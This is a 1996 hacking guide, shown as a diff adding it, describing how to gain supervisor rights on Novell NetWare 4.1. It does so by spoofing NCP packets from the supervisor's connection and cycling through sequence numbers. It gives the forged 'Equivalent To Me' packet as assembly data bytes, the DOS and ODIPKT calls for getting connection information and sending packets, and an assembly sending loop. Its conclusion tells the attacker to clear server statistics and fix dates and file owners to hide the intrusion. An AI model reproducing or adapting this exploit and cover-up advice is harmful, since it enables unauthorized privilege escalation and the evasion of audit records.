@@ -1,0 +1,249 @@
+
+
+                       HACKING NOVELL NETWARE 4.1
+                   ----------------------------------
+			      Version 1.2
+
+                   by Ilchenko Eugene and Gusev Igor
+
+
+                                  1996
+
+                                Contents
+
+
+Introduction...........................................................3
+1.Exchange packets principle...........................................4
+2.The common idea of cracking..........................................4
+3.How to get Supervisor's rights.......................................5
+4.Consequences.........................................................7
+Conclusion............................................................10
+
+
+
+                              Introduction
+
+
+
+   As you know everything can be broken and NOVELL  NETWARE  is  not  an
+exeption. But the time for cracking something is defined by the time  of
+geting information about it. The more information you will find the more
+easy it will be for you to crack.
+   In this documentation we'd like to tell you some sence  about  NOVELL
+net and about cracking it.
+This document is only for studying.In this document only the common 
+principles are discussed. If you still wonna hack you should know IPX 
+and NCP (netware core protocol) and think little for
+yourself.
+
+   Excuse our English - it is not our first language. :)
+
+
+                     1.Exchange packets principle.
+
+   First of all the server and workstations send packets to  each  other
+accoding to the special protocol known as Netware Core Protocol ( NCP  )
+based on the IPX protocol. Every packet is sighed with  its  own  number
+from 0 to 255 stored in one  byte.  This  field  is  known  as  Sequence
+Number. Look at the packet structure.
+
+
+                          The packet structure
+
+     Field      Number     Memory               Meaning
+               of bytes   location
+
+------------------------ Phisical packet header ------------------------
+
+ReceiverAddress     6      Normal    The address of the workstation that
+                                     will recive the packet
+SenderAddress       6      Normal    The address of the workstation that
+                                     sends the packet
+DataLength          2     High-Low   The packet length
+
+------------------------- IPX protocol header --------------------------
+CheckSum            2      Normal    The packet checksum.
+IpxLength           2     High-Low   The IPX packet length
+HopCount            1        -       Number of bridges to overcome
+PacketType          1        -       The packet type.
+DestNetwork         4      Normal    The destination subnet address
+DestNode            6      Normal    The destination workstation address
+DestSocket          2     Low-High   The destination programme socket
+SourceNetwork       4      Normal    The source subnet addres
+
+
+SourceNode          6      Normal    The source workstation address
+SourceSocket        2     Low-High   the source programme socket
+
+------------------------- NCP protocol header --------------------------
+RequestType         2     Low-High   Depends on the request
+SequenceNumber      1        -       The number of the packet
+ConectionNumberLow  1        -       The conrction number.During the lo-
+                                     gin operation every station are as-
+                                     signed with the its own number
+TaskNumber          1        -       The task number. It is for worksta-
+                                     ion  I  guess. Never mind about it.
+                                     Just set it zero or whatever number
+                                     you like.
+ConectionNumberHigh 1        -       Always 0.
+FunctionCode        1        -       The function identificator.
+
+-------------------------- NCP protocol data ---------------------------
+       -            -        -       Depends on the requet type and the
+                                     function
+
+ The initiater is the workstation. It sends  a  requirement  packet  and
+waits for an answer. The server receives the packet , check the  station
+address , the subnet address ,  the  socket  ,  the  conection  and  the
+sequence number. If something is wrong the server reject  to  accomplish
+the requirement operation and send the answer.
+
+
+
+                     2.The common idea of cracking.
+
+    As was said above the server checks all the packets it receives. But
+if to form the packet like the other workstation, set its  addresses  in
+the packet , set its connection number and so on and then to send it  to
+the net the server will never know whos request it has  accomplished.The
+main difficulty is the  sequens  number  because  others fields  can  be
+obtained from the server with the usual functions. To make  sure  server
+the server has accomplish the operation you should send the same  packet
+255 times with different sequens numbers.
+
+
+
+                    3.How to get supervisor's rights
+
+    You can  get  supervisor's  rights  just  having  become  supervisor
+equevalent. There is a function known  as  EQUIVALENT  TO  ME  that  you
+should send in name of supervisor. Look at the packet structure.
+
+        The packet structure with function EQUIVALENT TO ME
+
+------------------------ Phisical packet header ------------------------
+RecAdr                db 00,20h,0afh,4fh,5fh,0ah
+SndAdr                db 00,20h,0afh,089h,022h,0afh
+DataLength            db 01,68h
+-------------------------- IPX packet header ---------------------------
+                      dw 0ffffh
+IpxLength             db 01,67h
+                      db 0
+                      db 17
+DestNetwork           db ?,?,?,?
+DestNode              db ?,?,?,?,?,?
+DestSocket            db 04,51h
+SourceNetWork         db 00,00,01,02
+SourceNode            db ?,?,?,?,?,?
+SourceSocket          db 40h,03
+-------------------------- NCP packet header ---------------------------
+                      db 22h,22h
+SequenceNumber        db 48
+ConnectionNumberLow   db 24
+                      db 4
+                      db 0
+                      db 68h
+                      db 2
+--------------------------- NCP packet data ----------------------------
+                      dd -1
+                      dd 514
+S1_2:                 dd offset S1_1 - offset S1_2-4
+                      dd 0
+                      dd 9
+                      dd 0
+                      dd 0
+                      dd 0
+S1ID                  db 67h,02h,00,06h
+                      dd 1
+                      dd 5
+                      dd 34
+                      db 'E',0,'q',0,'u',0,'i',0,'v',0,'a',0,'l',0,'e',0
+                      db 'n',0,'t',0,' ',0,'T',0,'o',0,' ',0,'M',0,'e',0
+                      dd 0
+                      dd 1
+                      dd 26
+                      db '3',0,'1',0,'0',0,'7',0,'.',0,'I',0,'N',0,'F',0
+                      db '.',0,'T',0,'S',0,'U',0
+                      
+     !!! - two last strings - your full network name (like 3107.inf.tsu)
+
+
+   To get supervisor's address,subnet,socket,ID,conection number you can
+via the function Get Connection Information. Look below.
+
+
+
+                       Get Connection Information
+  ah=E3h
+  ds:si=> ConReq
+            dw 2           - length
+            db 16h         - subfunction
+            db ?           - Conection Number
+  es:di=> ConRep
+            dw 62          - length
+            db 4 dup (?)   
+            dw ?           - User Type
+            db 56 duo (?)  - User login name
+  int 21h
+
+    You can send the packet via IPX driver (function 9) but in this case
+you have not access to the phisical packet header. I  guess  the  server
+does not check the sender address there.
+    You can also send the packet via LSL driver but it is too difficult.
+    The simplest way is to send the packet via ODIPKT driver (  function
+4 ).
+
+                         Send Packet Via Odipkt
+
+      ah=4
+      cx=length
+      ds:si=>packet
+      int 60h
+      C=1 if error
+
+
+                    The procedure of sending packets
+
+Send            proc
+                mov SequenceNumber,0
+@@1:            push ds
+                push es
+                mov ah,4
+                mov cx,Length
+                mov si,offset Packet
+                int 60h
+                pop es
+                pop ds
+                jc @@1
+                mov cx,1000
+                loop $-2
+                dec SequenceNumber
+                jne @@1
+                ret
+Send            endp
+
+
+
+                            4.Consequences.
+
+    After answering a  packet  a  server  waits  for  another  one  with
+incremented sequence number. If you try to squees your packet  into  the
+work between the server and the workstation then there will  appear  the
+dissequence of packets and the user will hang up. But you can avoid this
+by sending 256*255 packets more.
+
+
+
+                               Conclusion
+
+    If you realize the program accoding to this documentation  you  will
+get big rights. I hope you will not harm anybody. Moreover,do not forget
+that all what you do is fixed on the server.Clear off the server statis-
+tic. Don't forget about dates and file owners.
+
+Copyright 1995. by dISEr&_Igor_        (http://www.tsu.tomsk.su/~eugene/)
+
+All comments, ideas, and questions send to eugene@info.tsu.tomsk.su 
+(especially for Novell company - i dont know any e-mail address of the 
+ Sequrity Expert of the Novell Company, and i want to know it....) 
+ 
